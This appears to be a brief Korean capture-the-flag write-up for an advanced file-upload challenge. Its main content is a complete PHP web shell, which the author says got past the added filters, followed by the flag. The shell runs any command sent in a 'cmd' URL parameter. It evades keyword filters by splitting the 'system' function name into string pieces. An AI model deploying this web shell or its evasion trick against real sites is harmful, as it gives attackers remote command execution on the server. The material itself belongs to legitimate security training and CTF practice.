# File Upload (Adv)
필터링이 많아졌지만 일반 File Upload 문제와 같은 웹쉘로 Solve 하였다.

```php
<html>
    <meta http-equiv="Content-Type" content="text/html; charset=EUC-KR" />
    <body>
        <form method="get">
            <input type="text" name="cmd" size="50">
            <input type="submit" value="Run">
        </form>
        <pre>
            <?php
            if($_GET['cmd'])
            {
                $sy = "sy"."stem";
                $result = $sy($_GET['cmd']);
                echo "{$result}";
            }
            ?>
        </pre>
    </body>
</html>
```

## Flag
flag{hide_on_webshell}